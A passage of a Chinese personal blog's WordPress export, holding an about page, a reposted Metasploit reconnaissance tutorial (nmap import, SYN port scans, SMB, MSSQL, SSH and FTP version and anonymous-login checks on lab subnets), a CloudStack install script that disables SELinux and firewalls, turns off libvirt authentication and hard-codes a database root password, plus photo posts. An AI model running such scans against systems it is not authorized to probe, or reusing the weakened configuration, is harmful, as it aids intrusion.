		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?page_id=15</guid>
		<description></description>
		<content:encoded><![CDATA[本博客记录博主感兴趣的文章、音乐、视频和福利写真。
目前将有道云以及Wiz上的笔记逐步转移到博客。
时不时会写一些关于技术的文章(搬运占多数)，原创的文章都是以笔记的形式记录。
和教程不一样，我记录的是我写这篇文章为止所知道的东西，假如有错或者有补充，请务必留言指出。
也会写一些拿不出手的小项目，放在GitHub上，但鉴于里面还没什么可见人的东西，地址我就不放了。
如有兴趣希望可以交个朋友或者交换个友情链接（<a href="https://www.nervgeek.com/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5%E7%94%B3%E8%AF%B7%E9%A1%B5%E9%9D%A2" target="_blank" rel="noopener noreferrer">友链交换地址</a>）。
QQ : 1138099359
E-MAIL : mr9esx1138099359@gmail.com]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>15</wp:post_id>
		<wp:post_date><![CDATA[2015-10-12 07:10:55]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-11 23:10:55]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[closed]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%85%b3%e4%ba%8e%e6%88%91]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>3</wp:menu_order>
		<wp:post_type><![CDATA[page]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
														<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_page_template]]></wp:meta_key>
		<wp:meta_value><![CDATA[default]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[850]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_yoast_wpseo_content_score]]></wp:meta_key>
		<wp:meta_value><![CDATA[60]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>利用metasploit进行信息收集</title>
		<link>https://www.nervgeek.com/2015/10/14/%e5%88%a9%e7%94%a8metasploit%e8%bf%9b%e8%a1%8c%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86/</link>
		<pubDate>Wed, 14 Oct 2015 06:20:13 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=100</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>在进行信息收集的时候，我们既要全面详细的获取目标的信息，又要尽量隐藏自己不被发现。Metasploit作为一个非常全面的渗透工具，用来收集信息也非常好用。本文会详细的介绍如何利用Metasploit进行信息收集。</strong>
信息收集分为主动和被动两种方式。

<h2 id=""><strong>被动信息收集</strong></h2>

被动信息收集是指在不直接接触没目标系统的情况下寻找信息。比如，通过搜索引擎等方式可以获得目标的操作系统，开放的端口，web服务器软件等信息。

<h2 id="_2"><strong>主动信息收集</strong></h2>

主动信息收集中，我们可以直接和系统交互，从而获得更多的信息。比如通过扫描目标系统开放的端口来确定对方开放的服务。每一个开放的服务都可能给我们提供了入侵的机会。需要注意的是，主动的信息收集很可能被IDS和IPS抓住踪迹。

<h1 id="msfconsole"><strong>启动msfconsole</strong></h1>

首先启动数据库

<pre class="prettyprint lang-html prettyprinted"><span class="pln">service postgresql start</span></pre>

启动msfsploit服务

<pre class="prettyprint lang-html prettyprinted"><span class="pln">service metasploit start</span></pre>

<a class="highslide-image" target="_blank"><img title="041414_1105_Information1.jpg" alt="" data-original="" /></a>
启动msfconsole

<pre class="prettyprint lang-html prettyprinted"><span class="pln">msfconsole</span></pre>

<h1><strong>使用db_status确认数据库是否正确连接</strong></h1>

<a class="highslide-image" target="_blank"><img title="041414_1105_Information2.jpg" alt="" data-original="" /></a>

<h1><strong>将nmap的扫描结果导入到Metasploit</strong></h1>

当一个团队同时做事的时候，会有针对不同目标，不同时间的扫描结果。这时候知道如何把xml格式的nmap结果导入到metasploit框架里有助于高效的工作。
首先，使用-oX参数扫描我们的windows虚拟机，生成扫描结果的xml格式文件。

<pre class="prettyprint lang-html prettyprinted"><span class="pln">#nmap -Pn -sS -A -oX Target 192.168.20.0/24</span></pre>

<a class="highslide-image" target="_blank"><img title="041414_1105_Information3.jpg" alt="" data-original="" /></a>
使用db_import命令导入扫描结果到数据库中。使用hosts命令查看刚刚 导入的数据。

<pre class="prettyprint lang-html prettyprinted"><span class="pln">msf &gt; db_import Subnet1.xml
msf&gt; hosts</span></pre>

<a class="highslide-image" href="http://image.3001.net/images/20140508/13995243669188.jpg%21small" target="_blank"><img title="041414_1105_Information4.jpg" alt="" data-original="http://image.3001.net/images/20140508/13995243669188.jpg%21small" /></a>

<h1 id="msfconsolenmap"><strong>从MSFconsole中启动nmap</strong></h1>

在msfconsole中使用db_nmap命令启动扫描，可以将结果自动存储在数据库中。

<pre class="prettyprint lang-html prettyprinted"><span class="pln">#msf &gt; db_nmap -sS -A 172.16.32.131</span></pre>

<a class="highslide-image" href="http://image.3001.net/images/20140508/13995243674614.jpg%21small" target="_blank"><img title="041414_1105_Information5.jpg" alt="" data-original="http://image.3001.net/images/20140508/13995243674614.jpg%21small" /></a>
使用db_services命令查看存储在数据库中的扫描结果。

<pre class="prettyprint lang-html prettyprinted"><span class="pln">#msf &gt; db_services</span></pre>

<a class="highslide-image" href="http://image.3001.net/images/20140508/13995243707479.jpg%21small" target="_blank"><img title="041414_1105_Information6.jpg" alt="" data-original="http://image.3001.net/images/20140508/13995243707479.jpg%21small" /></a>

<h1 id="metasploit"><strong>使用metasploit自带的端口扫描器</strong></h1>

metasploit自带了多个端口扫描器，我们也可以利用这些端口扫描器来寻找目标。查看端口扫描器列表可以使用search命令。

<pre class="prettyprint lang-html prettyprinted"><span class="pln">#msf &gt; search portscan</span></pre>

<a class="highslide-image" href="http://image.3001.net/images/20140508/13995243749953.jpg%21small" target="_blank"><img title="041414_1105_Information7.jpg" alt="" data-original="http://image.3001.net/images/20140508/13995243749953.jpg%21small" /></a>
我们来使用SYN端口扫描器进行一次简单的扫描练习一下，使用 scanner/portscan/syn，设置RHOSTS为192.168.20.0/24,设置线程THREADS为100,然后使用run命令开始扫描。

<pre class="prettyprint lang-html prettyprinted"><span class="pln">#msf &gt; use scanner/portscan/syn</span></pre>

<a class="highslide-image" href="http://image.3001.net/images/20140508/13995243768170.jpg%21small" target="_blank"><img title="041414_1105_Information8.jpg" alt="" data-original="http://image.3001.net/images/20140508/13995243768170.jpg%21small" /></a>

<h1 id="server_message_block_scanning"><strong>Server Message Block Scanning</strong></h1>

metasploit可以通过smb_version模块来尝试识别windows的版本。

<pre class="prettyprint lang-html prettyprinted"><span class="pln">#msf &gt; use scanner/smb/smb_version</span></pre>

<a class="highslide-image" href="http://image.3001.net/images/20140508/13995243787827.jpg%21small" target="_blank"><img title="041414_1105_Information9.jpg" alt="" data-original="http://image.3001.net/images/20140508/13995243787827.jpg%21small" /></a>
扫描结果会存储在metasploit的数据库中，使用hosts命令可以查看。

<pre class="prettyprint lang-html prettyprinted"><span class="pln">#msf auxiliary(smb_version) &gt; hosts</span></pre>

<a class="highslide-image" href="http://image.3001.net/images/20140508/13995243798140.jpg%21small" target="_blank"><img title="041414_1105_Information10.jpg" alt="" data-original="http://image.3001.net/images/20140508/13995243798140.jpg%21small" /></a>

<h1 id="ms_sql_server"><strong>收集MS SQL server信息</strong></h1>

很多系统管理员自己都没有意识到自己的服务器上可能已经安装了MS SQLserver。因为安装一些软件需要预装数据库，比如Miscrosoft Visual Studio。默认MS SQL server会监听1433端口或者一个随机的TCP端口。如果监听的是随机端口的话，可以通过UDP在1434端口查询具体监听的是哪个端口。
metasploit有一个模块可以自动实现这些事情。叫做mssql_ping。

<pre class="prettyprint lang-html prettyprinted"><span class="pln">#msf &gt; use scanner/mssql/mssql_ping
msf auxiliary(mssql_ping) &gt; set RHOSTS 192.168.1.0/24
RHOSTS =&gt; 192.168.1.0/24
msf auxiliary(mssql_ping) &gt; set THREADS 255
THREADS =&gt; 255
msf auxiliary(mssql_ping) &gt; run</span></pre>

<a class="highslide-image" href="http://image.3001.net/images/20140508/13995243802774.jpg%21small" target="_blank"><img title="041414_1105_Information11.jpg" alt="" data-original="http://image.3001.net/images/20140508/13995243802774.jpg%21small" /></a>
如上图所示，metasploit除了可以获得监听的端口，还可以获得实例的名字，服务器版本。

<h1 id="ssh"><strong>获取SSH版本信息</strong></h1>

ssh是一种安全协议，有很多ssh的实现都被发现过漏洞。所以我们需要先识别ssh使用的软件版本。采用ssh_version模块。

<pre class="prettyprint lang-html prettyprinted"><span class="pln">msf &gt; use scanner/ssh/ssh_version</span></pre>

<a class="highslide-image" href="http://image.3001.net/images/20140508/13995243839089.jpg%21small" target="_blank"><img title="041414_1105_Information12.jpg" alt="" data-original="http://image.3001.net/images/20140508/13995243839089.jpg%21small" /></a>

<h1 id="ftp"><strong>扫描FTP版本</strong></h1>

FTP服务器通常都是一个网络中最薄弱的地方，一定要仔细的扫描目标网络中的FTP服务器。可以使用ftp_version模块来寻找目标网络中的FTP server。
<a class="highslide-image" href="http://image.3001.net/images/20140508/13995243857689.jpg%21small" target="_blank"><img title="041414_1105_Information13.jpg" alt="" data-original="http://image.3001.net/images/20140508/13995243857689.jpg%21small" /></a>
我们幸运的找到了一台FTP服务器，现在试试能不能匿名登陆。使用scanner/ftp/anonymous模块。扫描器结果显示，可以匿名登陆，但是只有读的权限。
<a class="highslide-image" href="http://image.3001.net/images/20140508/13995243865400.jpg%21small" target="_blank"><img title="041414_1105_Information14.jpg" alt="" data-original="http://image.3001.net/images/20140508/13995243865400.jpg%21small" /></a>
使用metasploit进行信息收集主要的方法就是上文所述了，接下来可以开始开始利用metasploit进行漏洞扫描和利用。
&nbsp;

<div><small>来源： &lt;<a href="http://www.freebuf.com/articles/network/33905.html">http://www.freebuf.com/articles/network/33905.html</a><small>&gt;</small></small></div>

<small><small> </small></small>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>100</wp:post_id>
		<wp:post_date><![CDATA[2015-10-14 14:20:13]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-14 06:20:13]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%88%a9%e7%94%a8metasploit%e8%bf%9b%e8%a1%8c%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86]]></wp:post_name>
		<wp:status><![CDATA[private]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="metasploit"><![CDATA[metasploit]]></category>
		<category domain="post_tag" nicename="%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86"><![CDATA[信息收集]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>CloudStack搭建简记</title>
		<link>https://www.nervgeek.com/2015/10/16/cloudstack%e6%90%ad%e5%bb%ba%e7%ae%80%e8%ae%b0/</link>
		<pubDate>Fri, 16 Oct 2015 01:49:04 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=193</guid>
		<description></description>
		<content:encoded><![CDATA[<!--StartFragment -->

<div>
###### 1.CloudStack Management ######
setenforce 0
sed -i 's/=enforcing/=disabled/' /etc/selinux/config
chkconfig --levels 35 iptables off
/etc/init.d/iptables stop
sed -i 's/=localhost.localdomain/manage.downtown8.com/' /etc/sysconfig/network
echo "192.168.15.2 manage.downtown8.com" &gt;&gt;/etc/hosts
yum -y install ntp
chkconfig ntpd on
service ntpd start
<!--more-->
touch /etc/yum.repos.d/cloudstack.repo
cd /etc/yum.repos.d/
#echo -e "[cloudstack]\nname=cloudstack\nbaseurl=<img src="file:///C:\Users\Mr9esx\AppData\Roaming\Tencent\QQ\Temp\%W@GJ$ACOF(TYDYECOKVDYB.png" alt="" />http://cloudstack.apt-get.eu/centos/6/4.5/\nenabled=1\ngpgcheck=0" &gt;cloudstack.repo
echo -e "[cloudstack]\nname=cloudstack\nbaseurl=<img src="file:///C:\Users\Mr9esx\AppData\Roaming\Tencent\QQ\Temp\%W@GJ$ACOF(TYDYECOKVDYB.png" alt="" />http://192.168.15.10/cloudstack/\nenabled=1\ngpgcheck=0" &gt;cloudstack.repo
yum -y install mysql-server
#[mysqld]
sed -i "7i\innodb_rollback_on_timeout=1\ninnodb_lock_wait_timeout=600\nmax_connections=350\nlog-bin=mysql-bin\nbinlog-format = 'ROW'" /etc/my.cnf
service mysqld start
chkconfig mysqld on
/usr/bin/mysqladmin -u root password 'downtown#2015'
yum -y install cloudstack-management
cloudstack-setup-databases cloud:downtown#2015@localhost --deploy-as=root:downtown#2015
cloudstack-setup-management
###########  2.配置NFS服务器  #############
setenforce 0
sed -i 's/=enforcing/=disabled/' /etc/selinux/config
chkconfig --levels 35 iptables off
/etc/init.d/iptables stop
sed -i 's/=localhost.localdomain/=nfs.downtown8.com/' /etc/sysconfig/network
echo "192.168.15.4 nfs.downtown8.com" &gt;&gt;/etc/hosts
yum -y install ntp
chkconfig ntpd on
service ntpd start
yum -y install nfs-utils
echo -e "/secondary *(rw,async,no_root_squash,no_subtree_check)\n/primary *(rw,async,no_root_squash,no_subtree_check)"  &gt;&gt;/etc/exports
mkdir /primary
mkdir /secondary
mount /dev/sdb1 /primary
mount /dev/sdc1 /secondary
sed -i '/Domain/ s/^#//' /etc/idmapd.conf
sed -i '/Domain/ s/local.domain.edu/downtown8.com/' /etc/idmapd.conf
sed -i '/LOCKD_TCPPORT/ s/^#//' /etc/sysconfig/nfs
sed -i '/LOCKD_UDPPORT/ s/^#//' /etc/sysconfig/nfs
sed -i '/MOUNTD_PORT/ s/^#//' /etc/sysconfig/nfs
sed -i '/RQUOTAD_PORT/ s/^#//' /etc/sysconfig/nfs
sed -i '/STATD_PORT/ s/^#//' /etc/sysconfig/nfs
sed -i '/STATD_OUTGOING_PORT/ s/^#//' /etc/sysconfig/nfs
service rpcbind start
service nfs start
chkconfig rpcbind on
chkconfig nfs on
########  3.CloudStack Management ########
mkdir /secondary
mount -t nfs 192.168.15.4:/secondary /secondary
df -h
/usr/share/cloudstack-common/scripts/storage/secondary/cloud-install-sys-tmplt -m /secondary -u <img src="file:///C:\Users\Mr9esx\AppData\Roaming\Tencent\QQ\Temp\%W@GJ$ACOF(TYDYECOKVDYB.png" alt="" />http://192.168.15.10/template/systemvm64template-4.5-kvm.qcow2.bz2  -h kvm -F
########  4.CloudStack Agent ########
setenforce 0
sed -i 's/=enforcing/=disabled/' /etc/selinux/config
chkconfig --levels 35 iptables off
/etc/init.d/iptables stop
sed -i 's/=localhost.localdomain/host1.downtown8.com/' /etc/sysconfig/network
echo "192.168.15.3 host1.downtown8.com" &gt;&gt;/etc/hosts
yum -y install ntp
chkconfig ntpd on
service ntpd start
touch /etc/yum.repos.d/cloudstack.repo
cd /etc/yum.repos.d/
#echo -e "[cloudstack]\nname=cloudstack\nbaseurl=<img src="file:///C:\Users\Mr9esx\AppData\Roaming\Tencent\QQ\Temp\%W@GJ$ACOF(TYDYECOKVDYB.png" alt="" />http://cloudstack.apt-get.eu/centos/6/4.5/\nenabled=1\ngpgcheck=0" &gt;cloudstack.repo
echo -e "[cloudstack]\nname=cloudstack\nbaseurl=<img src="file:///C:\Users\Mr9esx\AppData\Roaming\Tencent\QQ\Temp\%W@GJ$ACOF(TYDYECOKVDYB.png" alt="" />http://192.168.15.10/cloudstack/\nenabled=1\ngpgcheck=0" &gt;cloudstack.repo
yum -y install cloudstack-agent
sed -i '/#vnc_listen/s/^#//'  /etc/libvirt/qemu.conf
sed -i '/listen_tls/s/^#//' /etc/libvirt/libvirtd.conf
sed -i '/listen_tcp/s/^#//' /etc/libvirt/libvirtd.conf
sed -i '/tcp_port/s/^#//' /etc/libvirt/libvirtd.conf
sed -i '/auth_tcp/s/^#//' /etc/libvirt/libvirtd.conf
sed -i '/auth_tcp/s/sasl/none/' /etc/libvirt/libvirtd.conf
sed -i '/mdns_adv/s/^#//' /etc/libvirt/libvirtd.conf
sed -i '/LIBVIRTD_ARGS=/s/^#//' /etc/sysconfig/libvirtd
service libvirtd restart
lsmod | grep kvm
</div>

<!--more-->
<!--more-->
<!--more-->
<!--more-->]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>193</wp:post_id>
		<wp:post_date><![CDATA[2015-10-16 09:49:04]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-10-16 01:49:04]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[cloudstack%e6%90%ad%e5%bb%ba%e7%ae%80%e8%ae%b0]]></wp:post_name>
		<wp:status><![CDATA[private]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="cloudstack"><![CDATA[CloudStack]]></category>
		<category domain="category" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="post_tag" nicename="%e4%ba%91%e8%ae%a1%e7%ae%97"><![CDATA[云计算]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>友链申请</title>
		<link>https://www.nervgeek.com/%e5%8f%8b%e6%83%85%e9%93%be%e6%8e%a5%e7%94%b3%e8%af%b7%e9%a1%b5%e9%9d%a2/</link>
		<pubDate>Wed, 30 Dec 2015 07:58:09 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?page_id=429</guid>
		<description></description>
		<content:encoded><![CDATA[申请格式：

<pre>网站名称：
URL：
申请人：
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>429</wp:post_id>
		<wp:post_date><![CDATA[2015-12-30 15:58:09]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2015-12-30 07:58:09]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%8f%8b%e6%83%85%e9%93%be%e6%8e%a5%e7%94%b3%e8%af%b7%e9%a1%b5%e9%9d%a2]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>2</wp:menu_order>
		<wp:post_type><![CDATA[page]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
														<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_page_template]]></wp:meta_key>
		<wp:meta_value><![CDATA[default]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[875]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>2</wp:comment_id>
			<wp:comment_author><![CDATA[老乱]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[610651339@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url>http://123123123</wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[122.190.2.6]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2017-11-20 13:32:13]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2017-11-20 05:32:13]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[mmp]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_result]]></wp:meta_key>
			<wp:meta_value><![CDATA[false]]></wp:meta_value>
			</wp:commentmeta>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
			</wp:commentmeta>
						<wp:commentmeta>
	<wp:meta_key><![CDATA[akismet_history]]></wp:meta_key>
			<wp:meta_value><![CDATA[]]></wp:meta_value>
			</wp:commentmeta>
							</wp:comment>
					</item>
					<item>
		<title>指原莉乃   - 《OPEN BEAUTY》</title>
		<link>https://www.nervgeek.com/2016/02/18/%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83-%e3%80%8aopen-beauty%e3%80%8b/</link>
		<pubDate>Thu, 18 Feb 2016 05:28:35 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=918</guid>
		<description></description>
		<content:encoded><![CDATA[<!--more-->
<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/61589b67f79aaa4d525d015baed4c86e.jpg" rel="attachment wp-att-919"><img class="alignnone size-full wp-image-919" src="https://www.nervgeek.com/wp-content/uploads/2016/02/61589b67f79aaa4d525d015baed4c86e.jpg" alt="61589b67f79aaa4d525d015baed4c86e" width="1600" height="1165" /></a>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>918</wp:post_id>
		<wp:post_date><![CDATA[2016-02-18 13:28:35]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-02-18 05:28:35]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83-%e3%80%8aopen-beauty%e3%80%8b]]></wp:post_name>
		<wp:status><![CDATA[private]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="open-beauty"><![CDATA[OPEN BEAUTY]]></category>
		<category domain="post_tag" nicename="photo"><![CDATA[photo]]></category>
		<category domain="category" nicename="%e5%86%99%e7%9c%9f"><![CDATA[写真]]></category>
		<category domain="post_tag" nicename="%e5%86%99%e7%9c%9f"><![CDATA[写真]]></category>
		<category domain="post_tag" nicename="%e6%8c%87%e5%8e%9f%e8%8e%89%e4%b9%83"><![CDATA[指原莉乃]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[919]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[409]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>杂志《BombMagazine》2015年5月刊-宮脇咲良 cut</title>
		<link>https://www.nervgeek.com/2016/02/20/%e6%9d%82%e5%bf%97%e3%80%8abombmagazine%e3%80%8b2015%e5%b9%b45%e6%9c%88%e5%88%8a-%e5%ae%ae%e8%84%87%e5%92%b2%e8%89%af-cut/</link>
		<pubDate>Sat, 20 Feb 2016 14:32:30 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=966</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="https://www.nervgeek.com/wp-content/uploads/2016/02/1-20151012213832.jpg" rel="attachment wp-att-967"><img class="alignnone size-full wp-image-967" src="https://www.nervgeek.com/wp-content/uploads/2016/02/1-20151012213832.jpg" alt="1-20151012213832" width="1080" height="1313" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/2-20151012213833.jpg" rel="attachment wp-att-968"><img class="alignnone size-full wp-image-968" src="https://www.nervgeek.com/wp-content/uploads/2016/02/2-20151012213833.jpg" alt="2-20151012213833" width="1080" height="1338" /></a> <!--more--><a href="https://www.nervgeek.com/wp-content/uploads/2016/02/3-20151012213834.jpg" rel="attachment wp-att-969"><img class="alignnone size-full wp-image-969" src="https://www.nervgeek.com/wp-content/uploads/2016/02/3-20151012213834.jpg" alt="3-20151012213834" width="1080" height="1330" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/5-20151012213840.jpg" rel="attachment wp-att-970"><img class="alignnone size-full wp-image-970" src="https://www.nervgeek.com/wp-content/uploads/2016/02/5-20151012213840.jpg" alt="5-20151012213840" width="1080" height="1325" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/12-20151012213849.jpg" rel="attachment wp-att-971"><img class="alignnone size-full wp-image-971" src="https://www.nervgeek.com/wp-content/uploads/2016/02/12-20151012213849.jpg" alt="12-20151012213849" width="1080" height="1326" /></a> <a href="https://www.nervgeek.com/wp-content/uploads/2016/02/29-20151012213905.jpg" rel="attachment wp-att-972"><img class="alignnone size-full wp-image-972" src="https://www.nervgeek.com/wp-content/uploads/2016/02/29-20151012213905.jpg" 